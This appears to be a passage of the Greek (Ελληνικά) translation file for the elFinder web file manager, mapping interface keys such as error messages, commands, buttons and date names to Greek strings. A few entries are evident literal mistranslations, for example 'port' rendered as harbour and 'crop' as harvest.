/**
 * Ελληνικά translation
 * @author yawd <ingo@yawd.eu>
 * @version 2022-02-28
 */
 (function(root, factory) {
	if (typeof define === 'function' && define.amd) {
		define(['elfinder'], factory);
	} else if (typeof exports !== 'undefined') {
		module.exports = factory(require('elfinder'));
	} else {
		factory(root.elFinder);
	}
}(this, function(elFinder) {
	elFinder.prototype.i18.el = {
		translator : 'yawd &lt;ingo@yawd.eu&gt;',
		language   : 'Ελληνικά',
		direction  : 'ltr',
		dateFormat : 'd.m.Y H:i', // will show like: 28.02.2022 15:23
		fancyDateFormat : '$1 H:i', // will show like: Σήμερα 15:23
		nonameDateFormat : 'ymd-His', // noname upload will show like: 220228-152317
		messages   : {
			'getShareText' : 'Μερίδιο',
			'Editor ': 'Επεξεργαστής κώδικα',
			/********************************** errors **********************************/
			'error'                : 'Πρόβλημα',
			'errUnknown'           : 'Άγνωστο πρόβλημα.',
			'errUnknownCmd'        : 'Άγνωστη εντολή.',
			'errJqui'              : 'Μη έγκυρη ρύθμιση του jQuery UI. Τα components "selectable", "draggable" και "droppable" πρέπει να περιληφούν.',
			'errNode'              : 'το elFinder χρειάζεται να έχει δημιουργηθεί το DOM Element.',
			'errURL'               : 'Μη έγκυρες ρυθμίσεις για το elFinder! η επιλογή URL δεν έχει οριστεί.',
			'errAccess'            : 'Απαγορεύεται η πρόσβαση.',
			'errConnect'           : 'Δεν ήταν δυνατή η σύνδεση με το backend.',
			'errAbort'             : 'Η σύνδεση εγκαταλείφθηκε.',
			'errTimeout'           : 'Η σύνδεση έληξε.',
			'errNotFound'          : 'Δε βρέθηκε το backend.',
			'errResponse'          : 'Μή έγκυρη απάντηση από το backend.',
			'errConf'              : 'Μη έγκυρες ρυθμίσεις για το backend.',
			'errJSON'              : 'Το PHP JSON module δεν είναι εγκατεστημένο.',
			'errNoVolumes'         : 'Δεν βρέθηκαν αναγνώσιμα volumes.',
			'errCmdParams'         : 'Μη έγκυρες παράμετροι για την εντολή "$1".',
			'errDataNotJSON'       : 'Τα δεδομένα δεν είναι JSON.',
			'errDataEmpty'         : 'Τα δεδομένα είναι άδεια.',
			'errCmdReq'            : 'Το Backend request χρειάζεται όνομα εντολής.',
			'errOpen'              : 'Δεν ήταν δυνατό να ανοίξει το "$1".',
			'errNotFolder'         : 'Το αντικείμενο δεν είναι φάκελος.',
			'errNotFile'           : 'Το αντικείμενο δεν είναι αρχείο.',
			'errRead'              : 'Δεν ήταν δυνατόν να διαβαστεί το "$1".',
			'errWrite'             : 'Δεν ήταν δυνατή η εγγραφή στο "$1".',
			'errPerm'              : 'Απαγορεύεται η πρόσβαση.',
			'errLocked'            : '"$1" είναι κλειδωμένο και δεν μπορεί να μετονομαστεί, μετακινηθεί ή διαγραφεί.',
			'errExists'            : 'Το αρχείο με όνομα "$1" υπάρχει ήδη.',
			'errInvName'           : 'Μη έγκυρο όνομα αρχείου.',
			'errInvDirname'        : 'Μη έγκυρο όνομα φακέλου.',  // from v2.1.24 added 12.4.2017
			'errFolderNotFound'    : 'Ο φάκελος δε βρέθηκε.',
			'errFileNotFound'      : 'Το αρχείο δε βρέθηκε.',
			'errTrgFolderNotFound' : 'Ο φάκελος "$1" δε βρέθηκε.',
			'errPopup'             : 'Το πρόγραμμα πλήγησης εμπόδισε το άνοιγμα αναδυόμενου παραθύρου. Για ανοίξετε το αρχείο ενεργοποιήστε το στις επιλογές του περιηγητή.',
			'errMkdir'             : 'Η δυμιουργία του φακέλου "$1" δεν ήταν δυνατή.',
			'errMkfile'            : 'Η δημιουργία του αρχείου "$1" δεν ήταν δυνατή.',
			'errRename'            : 'Η μετονομασία του αρχείου "$1" δεν ήταν δυνατή.',
			'errCopyFrom'          : 'Δεν επιτρέπεται η αντιγραφή αρχείων από το volume "$1".',
			'errCopyTo'            : 'Δεν επιτρέπεται η αντιγραφή αρχείων στο volume "$1".',
			'errMkOutLink'         : 'Δεν είναι δυνατή η δημιουργία συνδέσμου προς έξω από τη ρίζα του τόμου.', // from v2.1 added 03.10.2015
			'errUpload'            : 'Πρόβλημα κατά το upload.',  // old name - errUploadCommon
			'errUploadFile'        : 'Το αρχείο "$1" δεν μπόρεσε να γίνει upload.', // old name - errUpload
			'errUploadNoFiles'     : 'Δεν βρέθηκαν αρχεία για upload.',
			'errUploadTotalSize'   : 'Τα δεδομένα υπερβαίνουν το επιτρεπόμενο μέγιστο μέγεθος δεδομένων.', // old name - errMaxSize
			'errUploadFileSize'    : 'Το αρχείο υπερβαίνει το επιτρεπόμενο μέγιστο μέγεθος.', //  old name - errFileMaxSize
			'errUploadMime'        : 'Ο τύπος αρχείου δεν επιτρέπεται.',
			'errUploadTransfer'    : 'Πρόβλημα μεταφοράς για το "$1".',
			'errUploadTemp'        : 'Δεν είναι δυνατή η δημιουργία προσωρινού αρχείου για μεταφόρτωση.', // from v2.1 added 26.09.2015
			'errNotReplace'        : 'Το αντικείμενο "$1" υπάρχει ήδη σε αυτήν τη θέση και δεν μπορεί να αντικατασταθεί από αντικείμενο με άλλο τύπο.', // new
			'errReplace'           : 'Δεν είναι δυνατή η αντικατάσταση του "$1".',
			'errSave'              : 'Το "$1" δεν ήταν δυνατόν να αποθηκευτεί.',
			'errCopy'              : 'Δεν ήταν δυνατή η αντιγραφή του "$1".',
			'errMove'              : 'Δεν ήταν δυνατή η μετακίνηση του "$1".',
			'errCopyInItself'      : 'Δεν είναι δυνατή η αντιγραφή του "$1" στον εαυτό του.',
			'errRm'                : 'Δεν ήταν δυνατή η αφαίρεση του "$1".',
			'errTrash'             : 'Δεν είναι δυνατή η είσοδος στα σκουπίδια.', // from v2.1.24 added 30.4.2017
			'errRmSrc'             : 'Δεν είναι δυνατή η κατάργηση των αρχείων προέλευσης.',
			'errExtract'           : 'Δεν ήταν δυνατή η ανάγνωση των αρχείων από "$1".',
			'errArchive'           : 'Δεν ήταν δυνατή η δημιουργία του αρχείου.',
			'errArcType'           : 'Ο τύπος αρχείου δεν υποστηρίζεται.',
			'errNoArchive'         : 'Το αρχείο δεν είναι έγκυρο ή δεν υποστηρίζεται ο τύπος του.',
			'errCmdNoSupport'      : 'Το backend δεν υποστηρίζει αυτή την εντολή.',
			'errReplByChild'       : 'Ο φάκελος “$1” δεν μπορεί να αντικατασταθεί από οποιοδήποτε αρχείο περιέχεται σε αυτόν.',
			'errArcSymlinks'       : 'Για λόγους ασφαλείας δεν είναι δυνατόν να διαβαστούν αρχεία που περιέχουν symlinks orη αρχεία με μη επιτρεπτά ονόματα.', // edited 24.06.2012
			'errArcMaxSize'        : 'Το μέγεθος του αρχείου υπερβαίνει το μέγιστο επιτρεπτό όριο.',
			'errResize'            : 'Δεν ήταν δυνατή η αλλαγή μεγέθους του "$1".',
			'errResizeDegree'      : 'Μη έγκυρος βαθμός περιστροφής.',  // added 7.3.2013
			'errResizeRotate'      : 'Δεν είναι δυνατή η περιστροφή της εικόνας.',  // added 7.3.2013
			'errResizeSize'        : 'Μη έγκυρο μέγεθος εικόνας.',  // added 7.3.2013
			'errResizeNoChange'    : 'Το μέγεθος της εικόνας δεν άλλαξε.',  // added 7.3.2013
			'errUsupportType'      : 'Ο τύπος αρχείου δεν υποστηρίζεται.',
			'errNotUTF8Content'    : 'Το αρχείο "$1" δεν είναι UTF-8 και δεν μπορεί να επεξεργασθεί.',  // added 9.11.2011
			'errNetMount'          : 'Δεν ήταν δυνατή η φόρτωση του "$1".', // added 17.04.2012
			'errNetMountNoDriver'  : 'Μη υποστηριζόμενο πρωτόκολο.',     // added 17.04.2012
			'errNetMountFailed'    : 'Η φόρτωση απέτυχε.',         // added 17.04.2012
			'errNetMountHostReq'   : 'Απαιτείται host εξυπηρετητής.', // added 18.04.2012
			'errSessionExpires'    : 'Η συνεδρία σας έχει λήξει λόγω αδράνειας.',
			'errCreatingTempDir'   : 'Δεν είναι δυνατή η δημιουργία προσωρινού καταλόγου: "$1"',
			'errFtpDownloadFile'   : 'Δεν είναι δυνατή η λήψη του αρχείου από το FTP: "$1"',
			'errFtpUploadFile'     : 'Δεν είναι δυνατή η μεταφόρτωση του αρχείου στο FTP: "$1"',
			'errFtpMkdir'          : 'Δεν είναι δυνατή η δημιουργία απομακρυσμένου καταλόγου στο FTP: "$1"',
			'errArchiveExec'       : 'Σφάλμα κατά την αρχειοθέτηση αρχείων: "$1"',
			'errExtractExec'       : 'Σφάλμα κατά την εξαγωγή αρχείων: "$1"',
			'errNetUnMount'        : 'Δεν είναι δυνατή η αποπροσάρτηση.', // from v2.1 added 30.04.2012
			'errConvUTF8'          : 'Μη μετατρέψιμο σε UTF-8', // from v2.1 added 08.04.2014
			'errFolderUpload'      : 'Δοκιμάστε το σύγχρονο πρόγραμμα περιήγησης, εάν θέλετε να ανεβάσετε το φάκελο.', // from v2.1 added 26.6.2015
			'errSearchTimeout'     : 'Έληξε το χρονικό όριο κατά την αναζήτηση "$1". Το αποτέλεσμα αναζήτησης είναι μερικό.', // from v2.1 added 12.1.2016
			'errReauthRequire'     : 'Απαιτείται εκ νέου εξουσιοδότηση.', // from v2.1.10 added 24.3.2016
			'errMaxTargets'        : 'Ο μέγιστος αριθμός επιλέξιμων στοιχείων είναι $1.', // from v2.1.17 added 17.10.2016
			'errRestore'           : 'Δεν είναι δυνατή η επαναφορά από τον κάδο απορριμμάτων. Δεν είναι δυνατός ο προσδιορισμός του προορισμού επαναφοράς.', // from v2.1.24 added 3.5.2017
			'errEditorNotFound'    : 'Δεν βρέθηκε πρόγραμμα επεξεργασίας σε αυτόν τον τύπο αρχείου.', // from v2.1.25 added 23.5.2017
			'errServerError'       : 'Παρουσιάστηκε σφάλμα από την πλευρά του διακομιστή.', // from v2.1.25 added 16.6.2017
			'errEmpty'             : 'Δεν είναι δυνατό το άδειασμα του φακέλου "$1".', // from v2.1.25 added 22.6.2017
			'moreErrors'           : 'Υπάρχουν $1 ακόμη σφάλματα.', // from v2.1.44 added 9.12.2018
			'errMaxMkdirs'         : 'Μπορείτε να δημιουργήσετε έως και $1 φακέλους ταυτόχρονα.', // from v2.1.58 added 20.6.2021

			/******************************* commands names ********************************/
			'cmdarchive'   : 'Δημιουργία archive αρχείου',
			'cmdback'      : 'Πίσω',
			'cmdcopy'      : 'Αντιγραφή',
			'cmdcut'       : 'Αφαίρεση',
			'cmddownload'  : 'Μεταφόρτωση',
			'cmdduplicate' : 'Αντίγραφο',
			'cmdedit'      : 'Επεξεργασία αρχείου',
			'cmdextract'   : 'Εξαγωγή αρχείων από archive',
			'cmdforward'   : 'Προώθηση',
			'cmdgetfile'   : 'Επιλέξτε αρχεία',
			'cmdhelp'      : 'Σχετικά με αυτό το λογισμικό',
			'cmdhome'      : 'Home',
			'cmdinfo'      : 'Πληροφορίες',
			'cmdmkdir'     : 'Νέος φάκελος',
			'cmdmkdirin'   : 'Σε Νέο Φάκελο', // from v2.1.7 added 19.2.2016
			'cmdmkfile'    : 'Νέος αρχείο',
			'cmdopen'      : 'Άνοιγμα',
			'cmdpaste'     : 'Επικόλληση',
			'cmdquicklook' : 'Προεπισκόπηση',
			'cmdreload'    : 'Ανανέωση',
			'cmdrename'    : 'Μετονομασία',
			'cmdrm'        : 'Διαγραφή',
			'cmdtrash'     : 'Στα σκουπίδια', //from v2.1.24 added 29.4.2017
			'cmdrestore'   : 'Επαναφέρω', //from v2.1.24 added 3.5.2017
			'cmdsearch'    : 'Έυρεση αρχείων',
			'cmdup'        : 'Μετάβαση στο γονικό φάκελο',
			'cmdupload'    : 'Ανέβασμα αρχείων',
			'cmdview'      : 'Προβολή',
			'cmdresize'    : 'Αλλαγή μεγέθους εικόνας',
			'cmdsort'      : 'Ταξινόμηση',
			'cmdnetmount'  : 'Προσάρτηση όγκου δικτύου', // added 18.04.2012
			'cmdnetunmount': 'Αποπροσάρτηση', // from v2.1 added 30.04.2012
			'cmdplaces'    : 'Προς τοποθεσίες', // added 28.12.2014
			'cmdchmod'     : 'Αλλαγή λειτουργίας', // from v2.1 added 20.6.2015
			'cmdopendir'   : 'Ανοίξτε έναν φάκελο', // from v2.1 added 13.1.2016
			'cmdcolwidth'  : 'Επαναφορά πλάτους στήλης', // from v2.1.13 added 12.06.2016
			'cmdfullscreen': 'ΠΛΗΡΗΣ ΟΘΟΝΗ', // from v2.1.15 added 03.08.2016
			'cmdmove'      : 'Κίνηση', // from v2.1.15 added 21.08.2016
			'cmdempty'     : 'Αδειάστε το φάκελο', // from v2.1.25 added 22.06.2017
			'cmdundo'      : 'Αναίρεση', // from v2.1.27 added 31.07.2017
			'cmdredo'      : 'Κάντε ξανά', // from v2.1.27 added 31.07.2017
			'cmdpreference': 'Προτιμήσεις', // from v2.1.27 added 03.08.2017
			'cmdselectall' : 'Επιλογή όλων', // from v2.1.28 added 15.08.2017
			'cmdselectnone': 'Επιλέξτε κανένα', // from v2.1.28 added 15.08.2017
			'cmdselectinvert': 'Αντιστροφή επιλογής', // from v2.1.28 added 15.08.2017
			'cmdopennew'   : 'Ανοιξε σε νέο παράθυρο', // from v2.1.38 added 3.4.2018
			'cmdhide'      : 'Απόκρυψη (Προτίμηση)', // from v2.1.41 added 24.7.2018

			/*********************************** buttons ***********************************/
			'btnClose'  : 'Κλείσιμο',
			'btnSave'   : 'Αποθήκευση',
			'btnRm'     : 'Αφαίρεση',
			'btnApply'  : 'Εφαρμογή',
			'btnCancel' : 'Ακύρωση',
			'btnNo'     : 'Όχι',
			'btnYes'    : 'Ναι',
			'btnMount'  : 'Mount',  // added 18.04.2012
			'btnApprove': 'Μεταβείτε στο $1 και εγκρίνετε', // from v2.1 added 26.04.2012
			'btnUnmount': 'Αποπροσάρτηση', // from v2.1 added 30.04.2012
			'btnConv'   : 'Μετατρέπω', // from v2.1 added 08.04.2014
			'btnCwd'    : 'Εδώ',      // from v2.1 added 22.5.2015
			'btnVolume' : 'Ογκος',    // from v2.1 added 22.5.2015
			'btnAll'    : 'Ολα',       // from v2.1 added 22.5.2015
			'btnMime'   : 'Τύπος MIME', // from v2.1 added 22.5.2015
			'btnFileName':'Ονομα αρχείου',  // from v2.1 added 22.5.2015
			'btnSaveClose': 'Αποθήκευση & Κλείσιμο', // from v2.1 added 12.6.2015
			'btnBackup' : 'Αντιγράφων ασφαλείας', // fromv2.1 added 28.11.2015
			'btnRename'    : 'Μετονομάζω',      // from v2.1.24 added 6.4.2017
			'btnRenameAll' : 'Μετονομασία (Όλα)', // from v2.1.24 added 6.4.2017
			'btnPrevious' : 'Προηγ ($1/$2)', // from v2.1.24 added 11.5.2017
			'btnNext'     : 'Επόμενο ($1/$2)', // from v2.1.24 added 11.5.2017
			'btnSaveAs'   : 'Αποθήκευση ως', // from v2.1.25 added 24.5.2017

			/******************************** notifications ********************************/
			'ntfopen'     : 'Άνοιγμα φακέλου',
			'ntffile'     : 'Άνοιγμα αρχείου',
			'ntfreload'   : 'Ανανέωση περιεχομένων φακέλου',
			'ntfmkdir'    : 'Δημιουργία φακέλου',
			'ntfmkfile'   : 'Δημιουργία αρχείων',
			'ntfrm'       : 'Διαγραφή αρχείων',
			'ntfcopy'     : 'Αντιγραφή αρχείων',
			'ntfmove'     : 'Μετακίνηση αρχείων',
			'ntfprepare'  : 'Προετοιμασία αντιγραφής αρχείων',
			'ntfrename'   : 'Μετονομασία αρχείων',
			'ntfupload'   : 'Ανέβασμα αρχείων',
			'ntfdownload' : 'Μεταφόρτωση αρχείων',
			'ntfsave'     : 'Αποθήκευση αρχείων',
			'ntfarchive'  : 'Δημιουργία αρχείου',
			'ntfextract'  : 'Εξαγωγή αρχείων από το archive',
			'ntfsearch'   : 'Αναζήτηση αρχείων',
			'ntfresize'   : 'Αλλαγή μεγέθους εικόνων',
			'ntfsmth'     : 'Σύστημα απασχολημένο>_<',
			'ntfloadimg'  : 'Φόρτωση εικόνας',
			'ntfnetmount' : 'Φόρτωση δικτυακού δίσκου', // added 18.04.2012
			'ntfnetunmount': 'Αποπροσάρτηση όγκου δικτύου', // from v2.1 added 30.04.2012
			'ntfdim'      : 'Απόκτηση διάστασης εικόνας', // added 20.05.2013
			'ntfreaddir'  : 'Ανάγνωση πληροφοριών φακέλου', // from v2.1 added 01.07.2013
			'ntfurl'      : 'Λήψη διεύθυνσης URL του συνδέσμου', // from v2.1 added 11.03.2014
			'ntfchmod'    : 'Αλλαγή λειτουργίας αρχείου', // from v2.1 added 20.6.2015
			'ntfpreupload': 'Επαλήθευση ονόματος αρχείου μεταφόρτωσης', // from v2.1 added 31.11.2015
			'ntfzipdl'    : 'Δημιουργία αρχείου για λήψη', // from v2.1.7 added 23.1.2016
			'ntfparents'  : 'Λήψη πληροφοριών διαδρομής', // from v2.1.17 added 2.11.2016
			'ntfchunkmerge': 'Επεξεργασία του μεταφορτωμένου αρχείου', // from v2.1.17 added 2.11.2016
			'ntftrash'    : 'Πετάξτε στα σκουπίδια', // from v2.1.24 added 2.5.2017
			'ntfrestore'  : 'Κάνω επαναφορά από τα σκουπίδια', // from v2.1.24 added 3.5.2017
			'ntfchkdir'   : 'Έλεγχος φακέλου προορισμού', // from v2.1.24 added 3.5.2017
			'ntfundo'     : 'Αναίρεση προηγούμενης λειτουργίας', // from v2.1.27 added 31.07.2017
			'ntfredo'     : 'Επανάληψη της προηγούμενης αναίρεσης', // from v2.1.27 added 31.07.2017
			'ntfchkcontent' : 'Έλεγχος περιεχομένου', // from v2.1.41 added 3.8.2018

			/*********************************** volumes *********************************/
			'volume_Trash' : 'Σκουπίδια', //from v2.1.24 added 29.4.2017

			/************************************ dates **********************************/
			'dateUnknown' : 'άγνωστο',
			'Today'       : 'Σήμερα',
			'Yesterday'   : 'Χθές',
			'msJan'       : 'Ιαν',
			'msFeb'       : 'Φεβ',
			'msMar'       : 'Μαρ',
			'msApr'       : 'Απρ',
			'msMay'       : 'Μαϊ',
			'msJun'       : 'Ιουν',
			'msJul'       : 'Ιουλ',
			'msAug'       : 'Αυγ',
			'msSep'       : 'Σεπ',
			'msOct'       : 'Οκτ',
			'msNov'       : 'Νοεμ',
			'msDec'       : 'Δεκ',
			'January'     : 'Ιανουάριος',
			'February'    : 'Φεβρουάριος',
			'March'       : 'Μάρτιος',
			'April'       : 'Απρίλιος',
			'May'         : 'Μάϊος',
			'June'        : 'Ιούνιος',
			'July'        : 'Ιούλιος',
			'August'      : 'Αύγουστος',
			'September'   : 'Σεπτέμβριος',
			'October'     : 'Οκτώβριος',
			'November'    : 'Νοέμβριος',
			'December'    : 'Δεκέμβριος',
			'Sunday'      : 'Κυριακή',
			'Monday'      : 'Δευτέρα',
			'Tuesday'     : 'Τρίτη',
			'Wednesday'   : 'Τετάρτη',
			'Thursday'    : 'Πέμπτη',
			'Friday'      : 'Παρασκευή',
			'Saturday'    : 'Σάββατο',
			'Sun'         : 'Κυρ',
			'Mon'         : 'Δευ',
			'Tue'         : 'Τρ',
			'Wed'         : 'Τετ',
			'Thu'         : 'Πεμ',
			'Fri'         : 'Παρ',
			'Sat'         : 'Σαβ',

			/******************************** sort variants ********************************/
			'sortname'          : 'κατά όνομα',
			'sortkind'          : 'κατά είδος',
			'sortsize'          : 'κατά μέγεθος',
			'sortdate'          : 'κατά ημερομηνία',
			'sortFoldersFirst'  : 'Πρώτα οι φάκελοι',
			'sortperm'          : 'με άδεια', // from v2.1.13 added 13.06.2016
			'sortmode'          : 'κατά τρόπο λειτουργίας',       // from v2.1.13 added 13.06.2016
			'sortowner'         : 'από τον ιδιοκτήτη',      // from v2.1.13 added 13.06.2016
			'sortgroup'         : 'ανά ομάδα',      // from v2.1.13 added 13.06.2016
			'sortAlsoTreeview'  : 'Επίσης το Treeview',  // from v2.1.15 added 01.08.2016

			/********************************** new items **********************************/
			'untitled file.txt' : 'Νέο αρχείο.txt', // added 10.11.2015
			'untitled folder'   : 'Νέος φάκελος',   // added 10.11.2015
			'Archive'           : 'ΝέοΑρχείο',  // from v2.1 added 10.11.2015
			'untitled file'     : 'Νέο αρχείο.$1',  // from v2.1.41 added 6.8.2018
			'extentionfile'     : '$1: Αρχείο',    // from v2.1.41 added 6.8.2018
			'extentiontype'     : '$1: $2',      // from v2.1.43 added 17.10.2018

			/********************************** messages **********************************/
			'confirmReq'      : 'Απαιτείται επιβεβαίωση',
			'confirmRm'       : 'Είστε σίγουροι πως θέλετε να διαγράψετε τα αρχεία?<br/>Οι αλλαγές θα είναι μόνιμες!',
			'confirmRepl'     : 'Αντικατάσταση του παλιού αρχείου με το νέο?',
			'confirmRest'     : 'Αντικατάσταση υπάρχοντος στοιχείου με το στοιχείο στον κάδο απορριμμάτων;', // fromv2.1.24 added 5.5.2017
			'confirmConvUTF8' : 'Δεν υπάρχει στο UTF-8<br/>Μετατροπή σε UTF-8;<br/>Τα περιεχόμενα γίνονται UTF-8 με αποθήκευση μετά τη μετατροπή.', // from v2.1 added 08.04.2014
			'confirmNonUTF8'  : 'Δεν ήταν δυνατός ο εντοπισμός της κωδικοποίησης χαρακτήρων αυτού του αρχείου. Πρέπει να μετατραπεί προσωρινά σε UTF-8 για επεξεργασία.<br/>Επιλέξτε την κωδικοποίηση χαρακτήρων αυτού του αρχείου.', // from v2.1.19 added 28.11.2016
			'confirmNotSave'  : 'Έχει τροποποιηθεί.<br/>Χάνεται η εργασία εάν δεν αποθηκεύσετε τις αλλαγές.', // from v2.1 added 15.7.2015
			'confirmTrash'    : 'Είστε βέβαιοι ότι θέλετε να μετακινήσετε αντικείμενα στον κάδο απορριμμάτων;', //from v2.1.24 added 29.4.2017
			'confirmMove'     : 'Είστε βέβαιοι ότι θέλετε να μετακινήσετε στοιχεία στο "$1";', //from v2.1.50 added 27.7.2019
			'apllyAll'        : 'Εφαρμογή σε όλα',
			'name'            : 'Όνομα',
			'size'            : 'Μέγεθος',
			'perms'           : 'Δικαιώματα',
			'modify'          : 'Τροποποιήθηκε',
			'kind'            : 'Είδος',
			'read'            : 'ανάγνωση',
			'write'           : 'εγγραφή',
			'noaccess'        : 'δεν υπάρχει πρόσβαση',
			'and'             : 'και',
			'unknown'         : 'άγνωστο',
			'selectall'       : 'Επιλογή όλων',
			'selectfiles'     : 'Επιλογή αρχείων',
			'selectffile'     : 'Επιλογή πρώτου αρχείου',
			'selectlfile'     : 'Επιλογή τελευταίου αρχείου',
			'viewlist'        : 'Προβολή λίστας',
			'viewicons'       : 'Προβολή εικονιδίων',
			'viewSmall'       : 'Μικρά εικονίδια', // from v2.1.39 added 22.5.2018
			'viewMedium'      : 'Μεσαία εικονίδια', // from v2.1.39 added 22.5.2018
			'viewLarge'       : 'Μεγάλα εικονίδια', // from v2.1.39 added 22.5.2018
			'viewExtraLarge'  : 'Πολύ μεγάλα εικονίδια', // from v2.1.39 added 22.5.2018
			'places'          : 'Τοποθεσίες',
			'calc'            : 'Υπολογισμός',
			'path'            : 'Διαδρομή',
			'aliasfor'        : 'Ψευδώνυμο για',
			'locked'          : 'Κλειδωμένο',
			'dim'             : 'Διαστάσεις',
			'files'           : 'Αρχεία',
			'folders'         : 'Φάκελοι',
			'items'           : 'Αντικείμενα',
			'yes'             : 'ναι',
			'no'              : 'όχι',
			'link'            : 'Σύνδεσμος',
			'searcresult'     : 'Αποτελέσματα αναζήτησης',
			'selected'        : 'επιλεγμένα αντικείμενα',
			'about'           : 'Σχετικά',
			'shortcuts'       : 'Συντομεύσεις',
			'help'            : 'Βοήθεια',
			'webfm'           : 'εργαλείο διαχείρισης αρχείων από το web',
			'ver'             : 'Έκδοση',
			'protocolver'     : 'έκδοση πρωτοκόλλου',
			'homepage'        : 'Σελίδα του project',
			'docs'            : 'Τεκμηρίωση (documentation)',
			'github'          : 'Κάντε μας fork στο Github',
			'twitter'         : 'Ακολουθήστε μας στο twitter',
			'facebook'        : 'Βρείτε μας στο facebook',
			'team'            : 'Ομάδα',
			'chiefdev'        : 'κύριος προγραμματιστής',
			'developer'       : 'προγραμματιστής',
			'contributor'     : 'συνεισφορά',
			'maintainer'      : 'συντηρητής',
			'translator'      : 'μεταφραστής',
			'icons'           : 'Εικονίδια',
			'dontforget'      : 'και μην ξεχάσεις την πετσέτα σου!',
			'shortcutsof'     : 'Οι συντομεύσεις είναι απενεργοποιημένες',
			'dropFiles'       : 'Κάντε drop τα αρχεία εδώ',
			'or'              : 'ή',
			'selectForUpload' : 'Επιλογή αρχείων για ανέβασμα',
			'moveFiles'       : 'Μετακίνηση αρχείων',
			'copyFiles'       : 'Αντιγραφή αρχείων',
			'restoreFiles'    : 'Επαναφέρετε τα στοιχεία', // from v2.1.24 added 5.5.2017
			'rmFromPlaces'    : 'Αντιγραφή από τοποθεσίες',
			'aspectRatio'     : 'Αναλογία διαστάσεων',
			'scale'           : 'Κλίμακα',
			'width'           : 'Πλάτος',
			'height'          : 'Ύψος',
			'resize'          : 'Αλλαγή μεγέθους',
			'crop'            : 'Σοδειά',
			'rotate'          : 'Περιστροφή',
			'rotate-cw'       : 'Περιστροφή κατά 90 βαθμούς CW',
			'rotate-ccw'      : 'Περιστροφή κατά 90 βαθμούς CCW',
			'degree'          : 'Βαθμός',
			'netMountDialogTitle' : 'Φορτώστε δικτυακό δίσκο', // added 18.04.2012
			'protocol'            : 'Πρωτόκολλο', // added 18.04.2012
			'host'                : 'Πλήθος', // added 18.04.2012
			'port'                : 'Λιμάνι', // added 18.04.2012
			'user'                : 'Χρήστης', // added 18.04.2012
			'pass'                : 'Κωδικός', // added 18.04.2012
			'confirmUnmount'      : 'Αποπροσαρτάτε το $1;',  // from v2.1 added 30.04.2012
			'dropFilesBrowser': 'Απόθεση ή επικόλληση αρχείων από το πρόγραμμα περιήγησης', // from v2.1 added 30.05.2012
			'dropPasteFiles'  : 'Απόθεση αρχείων, επικόλληση διευθύνσεων URL ή εικόνων (πρόχειρο) εδώ', // from v2.1 added 07.04.2014
			'encoding'        : 'Κωδικοποίηση', // from v2.1 added 19.12.2014
			'locale'          : 'Μικρός λοβός',   // from v2.1 added 19.12.2014
			'searchTarget'    : 'Στόχος: $1',                // from v2.1 added 22.5.2015
			'searchMime'      : 'Αναζήτηση με βάση τον τύπο MIME', // from v2.1 added 22.5.2015
			'owner'           : 'Ιδιοκτήτης', // from v2.1 added 20.6.2015
			'group'           : 'Ομιλος', // from v2.1 added 20.6.2015
			'other'           : 'Αλλος', // from v2.1 added 20.6.2015
			'execute'         : 'Εκτέλεση', // from v2.1 added 20.6.2015
			'perm'            : 'Αδεια', // from v2.1 added 20.6.2015
			'mode'            : 'Λειτουργία', // from v2.1 added 20.6.2015
			'emptyFolder'     : 'Ο φάκελος είναι κενός', // from v2.1.6 added 30.12.2015
			'emptyFolderDrop' : 'Ο φάκελος είναι κενός\\A Drop για προσθήκη στοιχείων', // from v2.1.6 added 30.12.2015
			'emptyFolderLTap' : 'Ο φάκελος είναι κενός\\Ένα παρατεταμένο πάτημα για προσθήκη στοιχείων', // from v2.1.6 added 30.12.2015
			'quality'         : 'Ποιότητα', // from v2.1.6 added 5.1.2016
			'autoSync'        : 'Αυτόματος συγχρονισμός',  // from v2.1.6 added 10.1.2016
			'moveUp'          : 'Μετακινηθείτε προς τα πάνω',  // from v2.1.6 added 18.1.2016
			'getLink'         : 'Λήψη συνδέσμου URL', // from v2.1.7 added 9.2.2016
			'selectedItems'   : 'Επιλεγμένα στοιχεία ($1)', // from v2.1.7 added 2.19.2016
			'folderId'        : 'Αναγνωριστικό φακέλου', // from v2.1.10 added 3.25.2016
			'offlineAccess'   : 'Να επιτρέπεται η πρόσβαση εκτός σύνδεσης', // from v2.1.10 added 3.25.2016
			'reAuth'          : 'Για εκ νέου έλεγχο ταυτότητας', // from v2.1.10 added 3.25.2016
			'nowLoading'      : 'Φορτώνει...', // from v2.1.12 added 4.26.2016
			'openMulti'       : 'Άνοιγμα πολλών αρχείων', // from v2.1.12 added 5.14.2016
			'openMultiConfirm': 'Προσπαθείτε να ανοίξετε τα αρχεία $1. Είστε βέβαιοι ότι θέλετε να ανοίξετε στο πρόγραμμα περιήγησης;', // from v2.1.12 added 5.14.2016
			'emptySearch'     : 'Τα αποτελέσματα αναζήτησης είναι κενά στον στόχο αναζήτησης.', // from v2.1.12 added 5.16.2016
			'editingFile'     : 'Επεξεργάζεται ένα αρχείο.', // from v2.1.13 added 6.3.2016
			'hasSelected'     : 'Έχετε επιλέξει $1 στοιχεία.', // from v2.1.13 added 6.3.2016
			'hasClipboard'    : 'Έχετε $1 στοιχεία στο πρόχειρο.', // from v2.1.13 added 6.3.2016
			'incSearchOnly'   : 'Η σταδιακή αναζήτηση προέρχεται μόνο από την τρέχουσα προβολή.', // from v2.1.13 added 6.30.2016
			'reinstate'       : 'Εγκαθιστώ πάλι', // from v2.1.15 added 3.8.2016
			'complete'        : '$1 ολοκληρώθηκε', // from v2.1.15 added 21.8.2016
			'contextmenu'     : 'Μενού περιβάλλοντος', // from v2.1.15 added 9.9.2016
			'pageTurning'     : 'Γυρίζοντας σελίδα', // from v2.1.15 added 10.9.2016
			'volumeRoots'     : 'Ρίζες όγκου', // from v2.1.16 added 16.9.2016
			'reset'           : 'Επαναφορά', // from v2.1.16 added 1.10.2016
			'bgcolor'         : 'Χρώμα του φόντου', // from v2.1.16 added 1.10.2016
			'colorPicker'     : 'Επιλογέας χρώματος', // from v2.1.16 added 1.10.2016
			'8pxgrid'         : 'Πλέγμα 8px', // from v2.1.16 added 4.10.2016
			'enabled'         : 'Ενεργοποιήθηκε', // from v2.1.16 added 4.10.2016
			'disabled'        : 'Ενεργοποιήθηκε', // from v2.1.16 added 4.10.2016
			'emptyIncSearch'  : 'Τα αποτελέσματα αναζήτησης είναι κενά στην τρέχουσα προβολή.\\APΠατήστε [Enter] για επέκταση του στόχου αναζήτησης.', // from v2.1.16 added 5.10.2016
